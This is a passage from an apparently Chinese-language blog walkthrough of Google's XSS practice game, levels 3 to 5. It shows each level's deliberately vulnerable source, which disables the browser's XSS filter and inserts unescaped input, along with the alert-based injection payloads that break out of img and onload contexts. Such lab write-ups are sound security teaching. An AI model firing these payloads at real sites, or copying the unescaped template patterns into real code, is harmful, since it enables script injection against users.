class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab1<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Image 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab2<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Image 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab3<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Image 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tabContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>关键代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span></code></pre><p><code>num</code>是#后面的输入，没有经过任何过滤，所以让它的img标签闭合，再加上我们的代码即可</p><p><code>&lt;img src=&#39;/static/level3/cloud + num + .jpg&#39; /&gt;</code></p><p>即变为<code>&lt;img src=&#39;/static/level3/cloud&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;.jpg&#39; /&gt;</code></p><p>Payload：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">'<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span></code></pre><img src="/article/xss/image-20210424150902973.png" class="" title="level3-1" loading="lazy"><img src="/article/xss/image-20210424150928175.png" class="" title="level3-2" loading="lazy"><hr><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><a href="https://xss-game.appspot.com/level4/frame#">https://xss-game.appspot.com/level4/frame#</a></p><p>源码·index.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Create timer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main timer page</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token comment"># Show the results page</span>      timer<span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'timer.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token string">'timer'</span> <span class="token punctuation">:</span> timer <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Timer.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">startTimer</span><span class="token punctuation">(</span><span class="token parameter">seconds</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        seconds <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           window<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"Time is up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> seconds <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">startTimer</span><span class="token punctuation">(</span><span class="token string">'&#123;&#123; timer &#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>关键代码</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">startTimer</span><span class="token punctuation">(</span><span class="token string">'&#123;&#123; timer &#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span></code></pre><p>默认3秒<code>seconds = parseInt(seconds) || 3;</code></p><p>输入100，看到加载如下</p><p><code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;100&#39;);&quot;&gt;</code></p><p>于是想办法闭合，用单引号闭合<code>startTimer</code>，然后写弹窗再和后面的<code>&#39;)</code>闭合</p><blockquote><p>onload 事件会在页面或图像加载完成后立即发生</p></blockquote><p>Payload:</p><pre class="language-none"><code class="language-none">&#39;);alert(&#39;1</code></pre><p>即变为<code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#39;);alert(&#39;1&#39;);&quot;&gt;</code></p><img src="/article/xss/image-20210424152557697.png" class="" title="level4-1" loading="lazy"><img src="/article/xss/image-20210424152620652.png" class="" title="level4-2" loading="lazy"><hr><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><a href="https://xss-game.appspot.com/level5/frame#">https://xss-game.appspot.com/level5/frame#</a></p><p>源码·confirm.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Thanks for signing up, you will be redirected soon...    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'&#123;&#123; next &#125;&#125;'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token comment"># Route the request to the appropriate template</span>    <span class="token keyword">if</span> <span class="token string">"signup"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'signup.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token string">"confirm"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'confirm.html'</span><span class="token punctuation">,</span>         <span class="token punctuation">&#123;</span><span class="token string">'next'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'next'</span><span class="token punctuation">,</span> <span class="token string">'welcome'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'welcome.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Signup.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- We're ignoring the email, but the poor user will never know! --></span>    Enter email: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reader-email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; next &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Next >><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Welcome.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token 